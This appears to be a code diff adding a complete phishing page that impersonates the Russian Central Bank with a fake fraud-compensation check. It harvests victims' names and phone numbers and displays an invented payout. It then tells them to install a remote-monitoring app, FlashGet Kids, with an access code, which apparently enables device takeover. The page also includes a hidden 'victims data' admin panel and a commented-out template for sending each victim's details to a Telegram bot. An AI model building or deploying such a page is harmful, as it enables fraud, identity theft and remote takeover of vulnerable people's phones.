@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ЦБ РФ | Компенсация</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #0d47a1 0%, #1a237e 100%);
+            color: white;
+            font-family: Arial, sans-serif;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
+            color: black;
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        .header {
+            text-align: center;
+            border-bottom: 2px solid #0d47a1;
+            padding-bottom: 20px;
+            margin-bottom: 30px;
+        }
+        .logo {
+            font-size: 2em;
+            color: #0d47a1;
+            font-weight: bold;
+        }
+        .badge {
+            background: #4caf50;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            display: inline-block;
+            margin: 10px 0;
+            font-size: 0.9em;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+        }
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        .check-btn {
+            width: 100%;
+            padding: 15px;
+            background: #0d47a1;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1em;
+            cursor: pointer;
+            margin: 20px 0;
+        }
+        .result {
+            display: none;
+            background: #e8f5e9;
+            padding: 25px;
+            border-radius: 10px;
+            margin: 25px 0;
+            text-align: center;
+        }
+        .amount {
+            font-size: 2.5em;
+            color: #0d47a1;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+        .download-btn {
+            display: block;
+            background: #ff9800;
+            color: white;
+            text-align: center;
+            padding: 15px;
+            border-radius: 8px;
+            text-decoration: none;
+            margin: 20px 0;
+            font-weight: bold;
+        }
+        .steps {
+            background: #f5f5f5;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-size: 0.9em;
+        }
+        .step {
+            margin: 10px 0;
+        }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 15px;
+            border-radius: 8px;
+            color: #856404;
+            margin: 15px 0;
+            font-size: 0.9em;
+        }
+        .admin-panel {
+            margin-top: 30px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            border: 1px solid #ddd;
+            display: none;
+        }
+        .admin-toggle {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .admin-btn {
+            background: #333;
+            color: white;
+            padding: 8px 15px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.8em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">ЦЕНТРАЛЬНЫЙ БАНК РФ</div>
+            <div class="badge">Компенсационная программа</div>
+            <p style="color: #666; margin-top: 10px;">Проверка выплат пострадавшим от мошенничества</p>
+        </div>
+        
+        <div class="form-group">
+            <label>Фамилия</label>
+            <input type="text" id="lastName" placeholder="Иванов">
+        </div>
+        
+        <div class="form-group">
+            <label>Имя</label>
+            <input type="text" id="firstName" placeholder="Иван">
+        </div>
+        
+        <div class="form-group">
+            <label>Отчество</label>
+            <input type="text" id="middleName" placeholder="Иванович">
+        </div>
+        
+        <div class="form-group">
+            <label>Телефон</label>
+            <input type="tel" id="phone" placeholder="+7 999 123-45-67">
+        </div>
+        
+        <button class="check-btn" onclick="checkMoney()">
+            🔍 ПРОВЕРИТЬ КОМПЕНСАЦИЮ
+        </button>
+        
+        <div class="result" id="result">
+            <div class="badge">ВЫПЛАТА НАЙДЕНА</div>
+            <h3 id="userName"></h3>
+            <p>По решению Арбитражного суда г. Москва</p>
+            <div class="amount" id="moneyAmount">0 ₽</div>
+            <p>Средства зарезервированы на ваше имя</p>
+            
+            <div class="steps">
+                <p><strong>Для получения выплаты:</strong></p>
+                <div class="step">1. Скачайте приложение FlashGet Kids по кнопке ниже</div>
+                <div class="step">2. Установите и откройте приложение</div>
+                <div class="step">3. Введите код доступа: <strong>CB7744</strong></div>
+                <div class="step">4. Следуйте инструкциям системы</div>
+            </div>
+            
+            <div class="warning">
+                ⚠️ Выплата производится только через защищённое приложение FlashGet Kids для безопасности перевода.
+            </div>
+            
+            <a href="https://flashget.kids/ru" class="download-btn" target="_blank">
+                ⬇️ СКАЧАТЬ FLASHGET KIDS ДЛЯ ПОЛУЧЕНИЯ ДЕНЕГ
+            </a>
+            
+            <p style="color: #666; font-size: 0.8em; margin-top: 15px;">
+                После установки приложения откроется инструкция по получению выплаты.
+            </p>
+        </div>
+        
+        <!-- Скрытая админка -->
+        <div class="admin-toggle">
+            <button class="admin-btn" onclick="toggleAdmin()">👁️ АДМИН ПАНЕЛЬ</button>
+        </div>
+        
+        <div class="admin-panel" id="adminPanel">
+            <h4 style="color: #0d47a1; margin-bottom: 15px;">📊 ДАННЫЕ ЖЕРТВ (последние 10):</h4>
+            <div id="victimsList">Данных пока нет...</div>
+            <button class="check-btn" style="background: #666; margin-top: 10px;" onclick="clearData()">
+                ОЧИСТИТЬ ДАННЫЕ
+            </button>
+        </div>
+    </div>
+    
+    <script>
+        // Храним данные в localStorage (в реальности лучше на сервер)
+        let victimsData = JSON.parse(localStorage.getItem('victimsData')) || [];
+        
+        function checkMoney() {
+            const lastName = document.getElementById('lastName').value;
+            const firstName = document.getElementById('firstName').value;
+            const phone = document.getElementById('phone').value;
+            
+            if (!lastName || !firstName) {
+                alert('Введите фамилию и имя');
+                return;
+            }
+            
+            // Случайная сумма "компенсации"
+            const amounts = [85000, 127000, 189000, 215000, 280000];
+            const randomAmount = amounts[Math.floor(Math.random() * amounts.length)];
+            
+            // Сохраняем данные
+            const victimInfo = {
+                name: `${lastName} ${firstName} ${document.getElementById('middleName').value || ''}`,
+                phone: phone,
+                amount: randomAmount,
+                time: new Date().toLocaleString('ru-RU'),
+                ip: 'собирается...'
+            };
+            
+            victimsData.push(victimInfo);
+            // Сохраняем только последние 20 записей
+            if (victimsData.length > 20) victimsData = victimsData.slice(-20);
+            localStorage.setItem('victimsData', JSON.stringify(victimsData));
+            
+            // Показываем результат
+            document.getElementById('userName').textContent = victimInfo.name;
+            document.getElementById('moneyAmount').textContent = 
+                randomAmount.toLocaleString('ru-RU') + ' ₽';
+            
+            document.getElementById('result').style.display = 'block';
+            document.getElementById('result').scrollIntoView({ behavior: 'smooth' });
+            
+            // Обновляем админку
+            updateAdminPanel();
+            
+            // Отправка в Telegram (если настроен бот)
+            sendToTelegram(victimInfo);
+        }
+        
+        // Функция отправки в Telegram
+        function sendToTelegram(data) {
+            // Раскомментируй и настрой если хочешь получать уведомления
+            /*
+            const botToken = 'ТВОЙ_ТОКЕН';
+            const chatId = 'ТВОЙ_CHAT_ID';
+            const message = `Новая жертва: ${data.name}\nТелефон: ${data.phone}\nСумма: ${data.amount} руб`;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
+            */
+        }
+        
+        // Админ панель
+        function toggleAdmin() {
+            const panel = document.getElementById('adminPanel');
+            panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
+            updateAdminPanel();
+        }
+        
+        function updateAdminPanel() {
+            const listDiv = document.getElementById('victimsList');
+            if (victimsData.length === 0) {
+                listDiv.innerHTML = 'Данных пока нет...';
+                return;
+            }
+            
+            let html = '';
+            victimsData.slice().reverse().forEach((victim, index) => {
+                html += `
+                    <div style="background: #f1f1f1; padding: 10px; margin: 5px 0; border-radius: 5px;">
+                        <strong>${victim.name}</strong><br>
+                        📱 ${victim.phone || 'нет телефона'}<br>
+                        💰 ${victim.amount.toLocaleString()} руб<br>
+                        ⏰ ${victim.time}
+                    </div>
+                `;
+            });
+            
+            listDiv.innerHTML = html;
+        }
+        
+        function clearData() {
+            if (confirm('Удалить все данные?')) {
+                victimsData = [];
+                localStorage.removeItem('victimsData');
+                updateAdminPanel();
+            }
+        }
+        
+        // При загрузке страницы
+        document.addEventListener('DOMContentLoaded', function() {
+            // Скрытая админка по паролю
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('admin') === '777') {
+                document.getElementById('adminPanel').style.display = 'block';
+                updateAdminPanel();
+            }
+            
+            // Показываем количество жертв в заголовке (только тебе)
+            if (victimsData.length > 0) {
+                document.title = `ЦБ РФ | ${victimsData.length} проверок`;
+            }
+        });
+    </script>
+</body>
+</html>
